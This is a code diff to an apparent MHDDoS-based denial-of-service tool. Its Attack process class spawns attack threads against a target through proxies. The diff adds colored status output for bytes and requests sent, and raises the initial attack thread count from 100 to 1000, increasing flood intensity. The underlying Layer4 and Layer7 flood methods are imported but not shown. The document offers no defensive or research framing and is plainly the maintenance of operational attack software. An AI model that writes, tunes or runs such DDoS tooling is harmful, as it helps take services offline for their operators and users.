@@ -12,6 +12,7 @@ from typing import List
 
 import psutil
 from PyRoxy import Proxy
+from blessed import Terminal
 
 from MHDDoS.methods.layer_4 import Layer4
 from MHDDoS.methods.layer_7 import Layer7
@@ -23,6 +24,9 @@ from MHDDoS.utils.misc import Counter, get_last_from_queue
 from MHDDoS.utils.proxies import load_proxies
 from MHDDoS.utils.targets import Target
 from utils.logs import get_logger_for_current_process
+
+
+term = Terminal()
 
 
 class AttackError(Exception):
@@ -79,7 +83,7 @@ class Attack(Process):
     # ATTACK THREADS
     attack_threads: List[Thread] = []
     attack_threads_stop_events: List[Event] = []
-    INITIAL_THREADS_COUNT = 100
+    INITIAL_THREADS_COUNT = 1000
     THREADS_MAX_LIMIT = 1
     THREADS_MIN_LIMIT = 1
     THREADS_STEP = 10
@@ -210,7 +214,7 @@ class Attack(Process):
             self.start_new_attack_thread()
 
         while True:
-            time.sleep(0.5)
+            time.sleep(1)
 
             tslr = time.time() - float(self.last_request_timestamp_counter)
             self.cpu_usage = self.process.cpu_percent()
@@ -248,7 +252,24 @@ class Attack(Process):
             bps_string = Tools.humanbytes(int(self.bytes_per_second))
             tp_string = Tools.humanformat(int(self.tp))
             tb_string = Tools.humanbytes(int(self.tb))
-            logger.info(f"Total sent: {tb_string} / {tp_string} r, per second: {bps_string}/s / {pps_string} r/s, tslr: {tslr * 1000:.0f} ms, "
+
+            per_second_string = f"{bps_string}/s / {pps_string} r/s"
+            if int(self.bytes_per_second) == 0:
+                per_second_string = term.red(per_second_string)
+            else:
+                per_second_string = term.green(per_second_string)
+
+            total_string = f"{tb_string} / {tp_string} r"
+            if int(self.total_bytes_counter) == 0:
+                total_string = term.red(total_string)
+
+            tslr_string = f"{tslr * 1000:.0f} ms"
+            if tslr > 10:
+                tslr_string = term.red(tslr_string)
+
+            logger.info(f"Total sent: {total_string}, "
+                        f"per second: {per_second_string}, "
+                        f"tslr: {tslr_string}, "
                         f"threads: {len(self.attack_threads_stop_events)}, cpu: {self.cpu_usage :.0f}%")
 
     def perform_sanity_checks(self):
